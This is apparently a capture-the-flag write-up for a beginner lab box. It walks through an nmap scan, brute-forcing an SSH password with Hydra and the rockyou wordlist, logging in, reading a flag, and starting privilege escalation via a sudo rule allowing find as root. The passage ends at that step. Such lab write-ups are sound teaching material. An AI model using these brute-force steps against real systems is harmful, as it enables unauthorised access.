---
title: "BattleH4ck: Easy - Welcome"
description: Welcome box solve
slug: battlehack_welcome
date: 2023-10-03 00:00:00+0000
image: images/welcome-cover.jpg
translationKey: battlehack_welcome
categories:
    - BattleH4ck
tags:
    - Linux
    - Pentest
weight: 1       
---
![image](https://user-images.githubusercontent.com/69204254/216841932-afe72fcb-e88d-4654-93f7-012e89faf17a.png)

## Given data

By reading the description of the mission, we can see that we need to connect to the machine by knowing that:

- The username *should* be **seela**
- The password *used* is **weak**
- IP address: 10.42.20.52

## Foothold

### Port scan

First, we need to know what services are open to us on the machine.
To do this, we will use *nmap*:

```bash
└─$ nmap 10.42.20.52 -T4 -sC -sV
```

```bash
Nmap scan report for 10.42.20.52
Host is up (0.064s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:c2:f2:9c:8f:17:5d:66:9a:90:c9:e9:b3:1a:0a:bc (RSA)
|   256 ea:73:61:43:b8:7d:db:88:2b:d7:a8:16:39:49:b6:40 (ECDSA)
|_  256 be:5e:54:f8:6d:3c:de:7d:53:17:99:08:65:0c:34:a0 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds
```

We can see that there is one open port which is SSH.
By remembering the given data, we have: 

- a username which *should* be **seela**
- a password which is *used* is **weak**

Before we continue, let's look at the used verbs.
There are "should" and "used".
When we look at the sentence about the password. There is the word "used" which is a bit confusing.
There are two possibilities of interpretation :

- **weak** is the password
- the password is weak, like to easy to guess

To know if the password is equal to **weak**, we should try to connect with it and with the username **seela**.
(The username is not that confusing, because it doesn't mean anything)

To connect to the machine by using our data, we can use **ssh**:

```bash
└─$ ssh seela@10.42.20.52
seela@10.42.20.54's password: weak
```

```bash
Permission denied, please try again.
```

By being denied, we can understand that our password is not equal to "weak" but is weak, like easy to guess.

### Bruteforce seela's password

To find the password used by seela, as Google says, we can use an attack called "bruteforce".
![image](https://user-images.githubusercontent.com/69204254/216843124-4edabd84-d823-4160-99b9-cc1e70e4f314.png)

In the first link: `https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/`
We can find that there is a tool called "Hydra" which can help us in this situation.
The website tells us that we need a username and a wordlist.
To know what wordlist we should use, we can try to ask google which one can be good to try.
![image](https://user-images.githubusercontent.com/69204254/216844703-e851e499-3d64-436c-aa13-1046feaed78f.png)

By looking at the first link, we can read that the wordlist rockyou can be good to try.
If you own a Kali Linux, rockyou can be found in /usr/share/wordlist/rockyou.txt.gz (you can also type the command: wordlists).

Right now, rockyou in gziped, to extract it, we can use **gunzip**, by doing:

```bash
└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Now we have a wordlist, let's run Hydra !

```bash
└─$ hydra -l seela -P /usr/share/wordlists/rockyou.txt ssh://10.42.20.52 -t 4
```

```bash
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.42.20.54:22/
[22][ssh] host: 10.42.20.54   login: seela   password: rockyou
1 of 1 target successfully completed, 1 valid password found
```

We got our password, which **rockyou** !

Let's try to connect to the machine the same way we used to do:

```bash
└─$ ssh seela@10.42.20.52
seela@10.42.20.54's password: rockyou
```

```bash
Linux welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw 5.15.0-39-generic #42-Ubuntu SMP Thu Jun 9 23:42:32 UTC 2022 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$
```

As we can see, we are now connected !
The first flag is in the directory in which we are:

```bash
seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ ls -l
```

```bash
total 4
-rw-r--r-- 1 root root 17 Feb  5 20:23 user.txt
```

```bash
└─$ cat user.txt
```

```bash
FLAG{someCharacters}
```

## Privilege Escalation

```bash
seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ sudo -l
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for seela: rockyou
```

```txt
Matching Defaults entries for seela on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seela may run the following commands on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
    (root) /usr/bin/find *
```
